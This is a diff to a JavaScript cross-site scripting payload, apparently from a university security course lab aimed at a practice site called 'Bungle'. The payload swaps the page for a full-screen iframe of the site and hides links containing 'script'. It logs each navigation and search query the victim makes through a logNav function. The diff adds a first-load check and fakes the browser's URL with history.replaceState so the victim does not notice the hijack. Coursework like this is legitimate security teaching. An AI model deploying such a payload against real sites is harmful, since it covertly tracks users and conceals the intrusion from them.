@@ -27,12 +27,14 @@ function payload(attacker) {
         $("html").html("<iframe id=\"frame1\" style='width:100%; height:100%;position:absolute;top:0;left:0;border:0;'></frame>");
         $("#frame1").attr("src", "http://eecs388.org/project2/");
         $("html").show();
-
+        var firstLoad = true;
         $("#frame1").load(function() {
             var frameDoc = $(this.contentDocument);
-            logNav(frameDoc, href);
             frameDoc.find("a[href *= 'script']").hide();
-
+            if(firstLoad){
+                logNav(frameDoc, href);
+                firstLoad = false;
+            }
             frameDoc.find('#bungle-lnk') // BUNGLE HOME
                 .click(function() {
                     logNav(frameDoc, this.target);
@@ -45,12 +47,15 @@ function payload(attacker) {
                 });
             frameDoc.find('.search-well form')
                 .submit(function() {
-                    logNav(frameDoc, this.target);
+                    var query = href + "?q=" + frameDoc.find("#query").val();
+                    logNav(frameDoc, query);
+                    window.history.replaceState('', "Bungle!","./search?q=" + frameDoc.find("#query").val());
 
                 });
             frameDoc.find('#search-again-btn')
                 .click(function() {
                     logNav(frameDoc, href);
+                    window.history.replaceState('', "Bungle!","./search");
                     
                 });
             frameDoc.find('#log-out-btn')
